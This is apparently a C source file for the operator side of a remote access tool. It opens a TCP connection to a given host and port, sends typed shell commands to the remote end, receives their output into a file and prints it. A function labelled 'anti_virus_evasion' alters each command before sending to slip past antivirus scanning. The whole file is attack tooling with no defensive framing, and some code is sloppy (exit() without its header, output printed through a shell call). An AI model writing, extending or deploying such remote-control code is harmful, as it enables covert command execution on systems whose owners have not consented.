
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/time.h>
#include <time.h>
#include <errno.h>
#include <fcntl.h>

#define MAX_ARGS 5
#define MAX_CMD_LEN 256

//Function prototypes
int send_command(int sock, char *cmd);
int send_file(int sock, char *file);
int recv_file(int sock, char *file);
void anti_virus_evasion(char *cmd);

int main(int argc, char *argv[]) {

	int sock;
	struct sockaddr_in addr;
	int port;
	char *host;
	char cmd[MAX_CMD_LEN];
	
	//Check for correct usage
	if (argc < 3) {
		fprintf(stderr, "Usage: %s <host> <port>\n", argv[0]);
		exit(1);
	}
	
	//Set host and port
	host = argv[1];
	port = atoi(argv[2]);
	
	//Create a socket
	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		fprintf(stderr, "Error creating socket: %s\n", strerror(errno));
		exit(1);
	}
	
	//Set address
	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(host);
	addr.sin_port = htons(port);
	
	//Connect to server
	if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
		fprintf(stderr, "Error connecting to server: %s\n", strerror(errno));
		exit(1);
	}
	
	//Run remote access loop
	while (1) {
		//Get user input
		printf("$ ");
		fgets(cmd, MAX_CMD_LEN, stdin);
		
		//Exit on EOF
		if (feof(stdin)) {
			break;
		}
		
		//Evade anti-virus
		anti_virus_evasion(cmd);
		
		//Send command to server
		if (send_command(sock, cmd) == -1) {
			fprintf(stderr, "Error sending command: %s\n", strerror(errno));
			exit(1);
		}
		
		//Receive command output
		if (recv_file(sock, "output.txt") == -1) {
			fprintf(stderr, "Error receiving command output: %s\n", strerror(errno));
			exit(1);
		}
		
		//Print command output
		printf("Output:\n");
		system("cat output.txt");
		printf("\n");
	}
	
	//Close connection
	close(sock);
	
	return 0;
}

int send_command(int sock, char *cmd) {
	int cmd_len = strlen(cmd);
	char buf[cmd_len + 1];
	
	//Send command length
	if (send(sock, &cmd_len, 4, 0) == -1) {
		return -1;
	}
	
	//Send command
	strcpy(buf, cmd);
	if (send(sock, buf, cmd_len, 0) == -1) {
		return -1;
	}
	
	return 0;
}

int send_file(int sock, char *file) {
	int fd;
	int read_bytes;
	int file_len;
	struct stat stat_buf;
	char buf[1024];
	
	//Open file
	if ((fd = open(file, O_RDONLY)) == -1) {
		return -1;
	}
	
	//Get file length
	if (fstat(fd, &stat_buf) == -1) {
		close(fd);
		return -1;
	}
	file_len = stat_buf.st_size;
	
	//Send file length
	if (send(sock, &file_len, 4, 0) == -1) {
		close(fd);
		return -1;
	}
	
	//Send file
	while ((read_bytes = read(fd, buf, 1024)) > 0) {
		if (send(sock, buf, read_bytes, 0) == -1) {
			close(fd);
			return -1;
		}
	}
	
	close(fd);
	return 0;
}

int recv_file(int sock, char *file) {
	int fd;
	int read_bytes;
	int file_len;
	char buf[1024];
	
	//Receive file length
	if (recv(sock, &file_len, 4, 0) == -1) {
		return -1;
	}
	
	//Open file
	if ((fd = open(file, O_WRONLY | O_CREAT, 0644)) == -1) {
		return -1;
	}
	
	//Receive file
	while (file_len > 0) {
		if ((read_bytes = recv(sock, buf, 1024, 0)) == -1) {
			close(fd);
			return -1;
		}
		write(fd, buf, read_bytes);
		file_len -= read_bytes;
	}
	
	close(fd);
	return 0;
}

//Function for anti-virus evasion
void anti_virus_evasion(char *cmd) {
	int i;
	
	//Replace all spaces with tabs
	for (i = 0; i < strlen(cmd); i++) {
		if (cmd[i] == ' ') {
			cmd[i] = '\t';
		}
	}
}